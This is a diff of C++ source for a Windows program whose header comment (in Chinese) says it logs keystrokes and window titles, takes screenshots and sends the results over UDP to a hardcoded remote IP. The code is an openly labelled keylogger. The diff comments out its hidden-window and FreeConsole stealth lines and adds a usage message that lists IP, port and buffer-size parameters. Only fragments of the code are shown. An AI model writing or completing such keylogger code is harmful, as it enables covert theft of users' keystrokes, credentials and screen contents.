@@ -5,7 +5,7 @@
 *
 *function: 记录键位，记录窗口标题，截图，udp传送等
 *
-*author:	nyhoo@outlook.com
+*author:	nyhoo@outlook.com<nyhoo>
 **/
 #define _CRT_SECURE_NO_WARNINGS
 #include <Shlobj.h>
@@ -18,7 +18,7 @@
 
 using namespace std;
 
-#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
+//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
 #pragma comment(lib,"ws2_32.lib")
 
 #define REMOTE_IP	"10.21.89.125"
@@ -26,6 +26,15 @@ using namespace std;
 #define	NEED_SAVE_BPM	0
 #define NEED_SEND_UDP	1
 
+//用法
+void static usage(const std::string& AppName)
+{
+	cout << AppName.c_str() << "    "
+		 << "[ipaddr]=127.0.0.1" << "    "
+		 << "[port]=12345" << "    "
+		 << "[bufsize]=512"
+		 << std::endl;
+}
 
 //用于记录结果的函数
 int key_log(UINT keyCode, const char* keyText, UINT len);
@@ -59,13 +68,14 @@ struct pkg_header
 
 int main(int argc, char** argv)
 {
-	FreeConsole();
+	//FreeConsole();
 	//单利运行
 	HANDLE hMutex = ::CreateMutexA(NULL, TRUE, ("keyloger@nyhoo"));
 	if (GetLastError() == ERROR_ALREADY_EXISTS)
 	{
 		return -1;
 	}
+	usage(argv[0]);
 	HANDLE handle = GetCurrentProcess();
 	HWND hwnd = GetConsoleWindow();
 	install(hwnd);
